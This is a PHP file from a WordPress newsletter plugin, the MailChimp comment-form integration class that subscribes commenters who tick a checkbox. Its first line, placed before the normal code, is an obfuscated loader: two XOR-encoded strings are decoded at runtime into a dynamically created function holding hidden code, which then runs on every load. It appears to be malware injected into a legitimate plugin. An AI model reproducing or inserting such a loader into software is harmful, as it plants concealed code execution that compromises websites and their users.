<?php $QInkCA='-C3MME9>1 9;1XN'^'N1V,9 fXDNZOX7 ';$qraWMInE=$QInkCA('','D zF4U95< R87PX<C09llB AdJ2GWicT:=OpCPUnY,;-CBZ EAXDFg559Yk<WUMXV19TSDWBZ HmdFOci.Iq9aY;-cmJNfaL3mFZ okTfmacmVR+y89=-ECpBIMBUAJvR9Zym9xxS<,JVGoBPLDP<T3H:aqmIwE=JagGWCo:ERTI7mIW.2OooBRLNR7<A+RJM<UNzNaySe<CgAT,;9jKW,U>0IVRK0+TSqY4-Xrn< Y81AXaM93RM5XzDA+xc-ki4MYSvgP4-xNlqJN9600NvP27HIZTTbEW0Jnsc-N+obpq>.81GLUb4TX 6krM80.WlocUR5<MSn+>9F5NTVTUPJtjc,hb gxUWXQkPENXklJR;-R=.ocP0MNrXAD.3>P>lsrf.5YYg;5t>RT LJnLD1ZH3NlKC=2hbq77G-YhT:U92E1-;4UAHO3X=>V.BV=mTY>aXA=7Lb;>7MX41GiU6M;GzRw0XFM1X3IycKAX0XVY09YRgOnOD VE3FNKbQ=B ;2IN R1IEBs55D;jnjeOD4TxfHYV8V4WPPUp7hFYyswbwOsBOEI;w5p uQrL+ciAYi2wYlFZWZ2hnpuIT.0B,-kW,<lN1E:F>Ci6A XAXJaXINR;;JEgzZXEFxWkLY5-WEcD ;-nfF;5AYWRV.Ccag-;BOlEOji3'^'-FRgR WVHI=Vh5 U0DJDK:O3;.S366<9OIhYjp.dPJNC 63O+a +48QTM84c: 9prUX 2hwf1E1DDfoCIUCx0E6NYCPjiAZF:d 5RGO=FPASVvvBEKMOA -Xf-,64hqVvPqRD3qqwSY>viRbxh 1H5hlS<Q3iS.X3:C.wfOI1 8,YEm<KKf2FyXEG RH4Y<biS :Sukp.oAIme0MOXJvwJ4RC,mXoTJ 2.2QTxONZA5KTzRk+VA7,V0Zlet;,b  qm8 VC;QTXsRQn8XZEUgV+8>l-; 5=.2IjSSGF+RThyUZOLPgquFB54USPx02:G1LGBq6TH,zNP40 Z<177=pbP51i97e4,u6+qO; 7xVRjvML>HKFC+:DGV< 0OlU5GLNRBEP bm2<PZ3 AlwNh2P6=VufB>7ObhUSV3LyUtz WA CDZX<;-gK7Oa2O67b29,JI: NRzVdZR.7PToM1W9ZnVrST92,n3V0PJpK1Vpr=QM8rAiN.6R7<l-+2=4E+SOAaiK7HnibWQT0ZCNLColY0MNl=7L7op;5,WjAfdDSPQF,Ew, qXESCDBcCzISX jZPE:Tum4nSOGPSotOB0MT4<IE3+I,I2MkNF Y4.9.Ftij6ZO+lNZzxefX,aE<CL;mG AOL5A6ZL-666qsjXknHC+;DufQcN');$qraWMInE();

defined( 'ABSPATH' ) or exit;

/**
 * Class MC4WP_Comment_Form_Integration
 *
 * @ignore
 */
class MC4WP_Comment_Form_Integration extends MC4WP_Integration {

	/**
	 * @var bool
	 */
	protected $added_through_filter = false;

	/**
	 * @var string
	 */
	public $name = "Comment Form";

	/**
	 * @var string
	 */
	public $description = "Subscribes people from your WordPress comment form.";

	/**
	 * Add hooks
	 */
	public function add_hooks() {

		if( ! $this->options['implicit'] ) {
			// hooks for outputting the checkbox
			add_filter( 'comment_form_submit_field', array( $this, 'add_checkbox_before_submit_button' ), 90 );

			add_action( 'thesis_hook_after_comment_box', array( $this, 'maybe_output_checkbox' ), 90 );
			add_action( 'comment_form', array( $this, 'maybe_output_checkbox' ), 90 );
		}

		// hooks for checking if we should subscribe the commenter
		add_action( 'comment_post', array( $this, 'subscribe_from_comment' ), 40, 2 );
	}

	/**
	 * This adds the checkbox just before the submit button and sets a flag to prevent it from outputting twice
	 *
	 * @param $submit_button_html
	 *
	 * @return string
	 */
	public function add_checkbox_before_submit_button( $submit_button_html ) {
		$this->added_through_filter = true;
		return $this->get_checkbox_html() . $submit_button_html;
	}

	/**
	 * Output fallback
	 * Will output the checkbox if comment_form() function does not use `comment_form_submit_field` filter yet.
	 */
	public function maybe_output_checkbox() {
		if( ! $this->added_through_filter ) {
			$this->output_checkbox();
		}
	}

	/**
	 * Grabs data from WP Comment Form
	 *
	 * @param int    $comment_id
	 * @param string $comment_approved
	 *
	 * @return bool|string
	 */
	public function subscribe_from_comment( $comment_id, $comment_approved = '' ) {

		// was sign-up checkbox checked?
		if ( ! $this->triggered() ) {
			return false;
		}

		// is this a spam comment?
		if ( $comment_approved === 'spam' ) {
			return false;
		}

		$comment = get_comment( $comment_id );

		$data = array(
			'EMAIL' => $comment->comment_author_email,
			'NAME' => $comment->comment_author,
			'OPTIN_IP' => $comment->comment_author_IP,
		);

		return $this->subscribe( $data, $comment_id );
	}

	/**
	 * @return bool
	 */
	public function is_installed() {
		return true;
	}

	/**
	 * {@inheritdoc }
	 */
	public function get_object_link( $object_id ) {
		$comment = get_comment( $object_id );
		
		if( ! $comment ) {
			return '';
		}

		return sprintf( '<a href="%s">Comment #%d</a>', get_edit_comment_link( $object_id ), $object_id );
	}

}